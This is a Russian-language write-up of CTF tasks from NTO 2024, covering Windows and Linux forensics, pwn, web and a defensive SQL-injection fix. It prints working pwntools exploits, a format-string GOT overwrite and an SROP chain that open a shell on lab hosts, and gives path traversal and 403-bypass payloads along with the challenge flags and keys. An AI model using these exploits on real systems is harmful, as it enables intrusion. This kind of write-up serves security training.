# Решение Forensics-1 (Windows)
1. Прочитав легенду, понимаем, что скорее всего ПО попало на компьютер через фишинговое письмо.
2. Rambler в истории браузера подтверждает нашу догадку.
> Ответ на вопрос №1 - фишинговое письмо

![mail](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics6.png)

3. Переходим в системные логи Windows, а именно в PowerShell. Пролистав чуть ниже находим подозрительное скачивание, а именно Rjomba.exe. Тут же и злосчастный IP.
> Ответ на вопрос №2 - 95.169.192.220:8080

![ip](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics1.png)

4. Источник вируса - фишинговое письмо, поэтому будем искать возможные дампы email'ов.
5. Находим в `C:\Users\Evgeniy\AppData\Local\Microsoft\Outlook` ost-дамп почты.
6. В браузере открываем первый попавшийся восстановитель ost-файлов и получим pst-файл.
7. Найдя любой pst-viewer получаем письма.
8. В одном из писем находим прикрепленный rar-файл. Закидываем его в Virus Total.
9. Отчет VirusTotal не оставляет сомнений, перед нами зараженный файл, с довольно свежей уязвимостью.
> Ответ на вопрос №3 - CVE-2023-38831 (WinRAR)

![cve](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics2.png)

10. Через поиск в системе находим ранее скачанный Rjomba.exe. Запускаем Ghidra и приступаем к анализу.
11. В интернете находим [статью](https://anti-debug.checkpoint.com/techniques/misc.html) с типичными способами обойти Windows Debug. Через поиск в Ghidra просматриваем все указанные в статье функции.
12. Обнаруживаем те самые функции в нашем вирусе.
> Ответ на вопрос №4 - IsDebuggerPresent, CheckRemoteDebuggerPresent (winapi)

![badfuncs](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics3.png)

13. Следующий вопрос по теме криптографии, поэтому скачиваем для Ghidra модуль FindCrypto.
14. Находим несколько криптографических функций, одна из них - AES Encryption, а в ней же переменная на 32 символа: `undefined (**ppauVar2) [32];`. Мы имеем дело с AES-256 CBC.
> Ответ на вопрос №5 - AES-256 CBC

![cryptofuncs](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics4.png)

15. Заканчиваем работу с Ghidra и скидываем наш файл на VirusTotal. Начинаем изучать отчет.
16. В разделе Behavior находим связи с `api.telegram.org`. Вирус взаимодействует с Telegram-ботом.
> Ответ на вопрос №7 - в Telegram-бот

![telegramisimposter](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics5.png)

17. Переходим к самой интересной части. А именно нахождению ключей и расшифровке файла на рабочем столе.
18. Для этого запускаем x64dbg на рабочем столе Windows.
19. Итерируем несколько десятков шагов и создаем дампы памяти.

![hardestpart](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics7.png)

20. Проходимся по дампам и обнаруживаем ключ от IV и AES.
21. В интернете ищем любой AES-decoder, где и получаем финальный ответ.
> Ответ на вопрос №6 - amogusamogusamogusamogusamogusam

> Ответ на вопрос №8 - sFYZ#2z9VdUR9sm`3JRz

![gg](https://github.com/artkegor/nto2024_writeups/blob/main/forensics1/forensics8.png)

22. Профит

---

# Решение Forensics-2 (Linux)
1. Для начала посмотрим логи. Один из интересующих нас - `/var/log/nginx/access.log.1`
2. Увидим что в нем много обращений к сервису Gitlab. Проверим его наличие в системе.
3. Дальше посмотрим историю пользователя и увидим там множество команд. Некоторые из них, например, по установке Gitlab.
> Ответ на вопрос №1 - Gitlab 15.2.2

![badlab](https://github.com/artkegor/nto2024_writeups/blob/main/forensics2/forensics2-3.png)

![badlab15.2.2](https://github.com/artkegor/nto2024_writeups/blob/main/forensics2/forensics2-4.png)

4. Так как хакер получил прямой доступ к управлению Linux-машиной и выполнению команд, то использовался RCE.
> Ответ на вопрос №2 - RCE
5. Есть лишний SUID бит, который позволяет пользователю получившему доступ из GitLab выполнять команды под рутом.
6. Через файл sshd_config указана опция PermitRootLogin yes, что позволяет злоумышленнику подключиться к серверу от root прямо по ssh
> Ответ на вопрос №3 - админ поставил SUID бит для GitLab и разрешил PermitRootLogin yes

> Ответ на вопрос №4 - SUID бит для GitLab
7. Посмотрим файл `/root/.ssh/authorized_keys` на предмет пользователей которые могут подключиться к серверу по SSH с помощью ключей и увидим там постороннего пользователя. 
> Ответ на вопрос №5 - amongus@debian оставил ключ в authorized_keys

![hugekeys](https://github.com/artkegor/nto2024_writeups/blob/main/forensics2/forensics2-6.png)

8. Посмотрим историю root'a в `.bash_history` и увидим там, что хакер удалял /tmp/linpeas.txt, это известный скрипт для поиска уязвимостей на Linux-серверах. `rm -rf /tmp/linpeas.txt`
> Ответ на вопрос №6 - скрипт linpeas.sh
9. Также в истории можем увидеть jynx2, загуглив информацию про него мы понимаем, что это Root-Kit.
> Ответ на вопрос №7 - jynx2.so

![jynx2](https://github.com/artkegor/nto2024_writeups/blob/main/forensics2/forensics2-1.png)

---

#  Решение PWN-1 (10)
1. Открыв файл в Ghidra видим функцию main, которая считывает ввод пользователя и выводит его в консоль.
2. Обнаруживаем функцию win() с командой ```/bin/sh```. Сюда и надо копать.
3. Понимаем, что нужно перезаписать exit-функцию на функцию win().
4. Сделать это возможно с помощью перезаписи GOT через Format-strings.
5. Нагугливаем очень хорошую статью с похожим кейсом - [вот сама статья](https://habr.com/ru/articles/460647/)
```
from pwn import *
from struct import *

start_addr = 0x401162
exit_addr = 0x404038

ex = process('./vuln')

payload = ("%98p%14$n%16303p%15$n").ljust(64, '*')
payload += pack("Q", exit_addr)
payload += pack("Q", exit_addr+1)

ex.sendline(payload)

ex.interactive()
```
6. Изучив код статьи понимаем, что вместо start_addr нам нужно найти адрес функции win().
7. Через gdb находим адреса в стеке.
```
exit_addr = 4210712
win_addr = 0x401156
```
8. Пишем итоговый эксплоит:
```
from pwn import *
from struct import *

exit_addr = 4210712
win_addr = 0x401156

ex = remote('192.168.12.13', 1923)

payload = (b"%86p%14$n%16315p%15$n").ljust(64, b"*")
payload += p64(exit_addr)
payload += p64(exit_addr+1)


ex.sendline(payload)

ex.interactive()
```
9. Профит
![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/pwn1/proofpwn1.png)

---

# Решение PWN-2 (20)
1. Откроем файл task и увидим в функции main() следующее содержимое:
```

void entry(void)

{
  syscall();
  return;
}

```
2. Видим syscall и понимаем, что нам нужен SROP для решения.
3. В самом конце файла записана строка `/bin/bash` которая и должна быть передана в качестве аргумента для `syscall`
4. Находим подходящую статью по SROP в учебнике по PWN - [вот ссылка](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop)
5. Пример в статье очень напоминает нам наш файл.
 Вот как это выглядит в статье:
 ```
 from pwn import *

  context.arch = 'amd64'
  context.os = 'linux'
  
  elf = ELF.from_assembly(
      '''
          mov rdi, 0;
          mov rsi, rsp;
          sub rsi, 8;
          mov rdx, 500;
          syscall;
          ret;
          
          pop rax;
          ret;
      ''', vma=0x41000
  )
  elf.save('vuln')
  ```
 И вот как у нас:
 ```
 00041000 48 c7 c7        MOV        RDI,0x0
       00 00 00 00
 00041007 48 89 e6        MOV        RSI,RSP
 0004100a 48 83 ee 08     SUB        RSI,0x8
 0004100e 48 c7 c2        MOV        RDX,0x1f4
       f4 01 00 00
 00041015 0f 05           SYSCALL
 00041017 c3              RET
 00041018 58              POP        RAX
 00041019 c3              RET
   ```
6. Пишем эксплойт по гайду и получаем такой код:
```
from pwn import *

elf = context.binary = ELF('./task', checksec=False)
p = remote('192.168.12.13', 1555)

BINSH = elf.address + 0x1430
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b  
frame.rdi = BINSH          
frame.rsi = 0x0          
frame.rdx = 0x0           
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
7. Профит
![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/pwn2/proofpwn2.png)

---

# Решение WEB-1 (10)
1. Открываем сайт и видим единственную активную ссылку.
2. Нажимаем на нее и видим это:
```
Hint_1 

maybe in etc/secret ???
```
3. Сам файл доступен с помощью GET-аргумента `?file_type=`.
4. Очевидно, что здесь можно использовать Path-Traversal.
5. Передаем в качестве аргумента следующее содержимое: `?file_type=../../etc/secret`
6. Профит

![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web1/web1-2.png)

---

# Решение WEB-2 (20)
1. В сурсах увидим, что пароль от админки находится прямо в коде.
2. Сконструируем URL, чтобы получить флаг. `http://192.168.12.13:8090/login?password=password`

![src](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web2/web2-1.png)

3. Профит

---

# Решение WEB-3 (30)
1. Перейдя в исходники таска, видим, что он настроен через HAProxy.
2. Нам нужно получить `/flag`, но он FORBIDDEN 403.
3. В HAproxy настроена проверка на `path_beg`.
4. Посмотрев в этой [статье](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses) способы обойти проверку, находим, что `//flag` позволяет получить доступ к нужной ссылке.

![//flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web3/web3-1.png)
5. Далее обнаруживаем, что работает SSTI.

![ssti](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web3/web3-2.png)

6. Кроме того, в самом коде настроена еще одна проверка ссылок, которая не позволяет нам запустить стандартные эксплоиты. В частности не разрешается `__class__`.
7. В этой [статье](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes) находим подходящий под фильтр пейлоад с `__builtins__`.

![builtins](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web3/web3-3.png)

8. Дальше дело за малым, копируем подходящий эксплоит с той же [статьи](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes).
9. Профит.

![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/web3/web3-4.png)

---

# Решение задачи на Defence
1. В файле auth_api.py видим SQL-инъекцию на 211 строке.  
Меняем это:  
```sql_query = "UPDATE user SET pw = '" + str(new_password) + "' WHERE login = '" + str(username) + "';"```  
На это:  
```update_cursor.execute( 'UPDATE user SET pw = ? WHERE login = ? ', (str(new_password), str(username),))```  
